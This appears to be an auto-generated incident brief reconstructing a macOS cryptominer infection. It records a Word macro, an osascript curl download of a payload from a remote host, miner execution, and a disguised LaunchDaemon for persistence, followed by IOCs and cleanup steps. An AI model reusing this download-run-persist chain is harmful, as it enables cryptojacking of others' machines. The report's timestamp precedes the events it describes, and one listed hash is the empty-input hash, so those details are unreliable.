# Incident Brief — P1 · mac-victim-07
*GraySentinel Cryptominer Kill-Chain Reconstructor v1.0.0 · 2026-09-16T03:30:02Z*

**Priority P1** — Active compromise: RCE + running miner + reboot persistence + live C2.  
**Macro verdict (Tool A):** MALICIOUS

## Attack timeline
| Time (UTC) | Stage | Process | Parent | Remote | Detail |
|---|---|---|---|---|---|
| 2026-09-16T09:41:02Z | Delivery | Microsoft Word | launchd |  | /Applications/Microsoft Word.app |
| 2026-09-16T09:41:03Z | Execution | osascript | Microsoft Word | 198.51.100.44:80 | osascript -e do shell script curl -s http://198.51.100.44/assets/update.bin -o /tmp/.u |
| 2026-09-16T09:41:03Z | Execution | osascript | Microsoft Word | 198.51.100.44:80 | NETWORK |
| 2026-09-16T09:41:05Z | Download (C2 stage-1) | curl | osascript | 198.51.100.44:80 | curl -s http://198.51.100.44/assets/update.bin -o /tmp/.u |
| 2026-09-16T09:41:07Z | Miner launch | sh | osascript |  | sh -c chmod +x /tmp/.u; /tmp/.u --pool 203.0.113.9:8443 |
| 2026-09-16T09:41:08Z | Miner launch | .u | sh | 203.0.113.9:8443 | /tmp/.u --pool 203.0.113.9:8443 --donate 0 |
| 2026-09-16T09:41:08Z | Miner launch | .u | sh | 203.0.113.9:8443 | NETWORK |
| 2026-09-16T09:41:12Z | Miner launch | .u | sh |  | write /Library/LaunchDaemons/com.apple.softwareupdated.helper.plist |
| 2026-09-16T09:41:13Z | Persistence | launchctl | .u |  | launchctl load /Library/LaunchDaemons/com.apple.softwareupdated.helper.plist |
| 2026-09-16T09:42:30Z | Miner launch | .u | launchd | 203.0.113.9:8443 | NETWORK |
| 2026-09-16T09:47:30Z | Miner launch | .u | launchd | 203.0.113.9:8443 | NETWORK |
| 2026-09-16T09:52:31Z | Miner launch | .u | launchd | 203.0.113.9:8443 | sustained_cpu_98pct |

## Indicators of Compromise (IOCs)
| Type | Value |
|---|---|
| C2 / network | `198.51.100.44:80` |
| C2 / network | `203.0.113.9:8443` |
| SHA-256 | `a94a8fe5ccb19ba61c4c0873d391e987982fbbd3b8c1795d9e1f6b5f7c9a1234` |
| SHA-256 | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` |
| Dropped file | `/tmp/.u` |
| Persistence | `/Library/LaunchDaemons/com.apple.softwareupdated.helper.plist` |

## ATT&CK coverage
| Tactic | Technique | Note |
|---|---|---|
| Initial Access | T1566.001 | Spearphishing attachment (macro-enabled doc) |
| Execution | T1204.002 | User opens document; AutoOpen fires macro |
| Execution | T1059.002 | osascript 'do shell script' pivot |
| Command & Control | T1105 | curl pulls stage-1 binary from 198.51.100.44 |
| Execution | T1059.004 | sh chmod +x and runs /tmp/.u miner |
| Impact | T1496 | XMRig-style resource hijack (98% CPU) |
| Persistence | T1543.001 | LaunchDaemon com.apple.softwareupdated.helper |
| Command & Control | T1071.001 | HTTPS beacon to 203.0.113.9:8443/gate |

## Containment & eradication checklist
1. Isolate mac-victim-07 from the network (disable Wi-Fi + pull cable).
2. Kill the miner:  sudo launchctl bootout system/com.apple.softwareupdated.helper
3. Remove persistence:  sudo rm /Library/LaunchDaemons/com.apple.softwareupdated.helper.plist
4. Delete dropped binary:  sudo rm -f /tmp/.u
5. Block C2 at the firewall/proxy: 198.51.100.44 (stage-1), 203.0.113.9:8443 (C2).
6. Hunt the sender: pull the phishing email + attachment; search mail flow for the same doc hash.
7. Sweep fleet for the plist name + /tmp/.u across all macOS endpoints (same IOC set).
8. Rotate credentials used on the host; reimage before returning to service.
9. Preserve /var/log + EDR export as evidence before wipe.
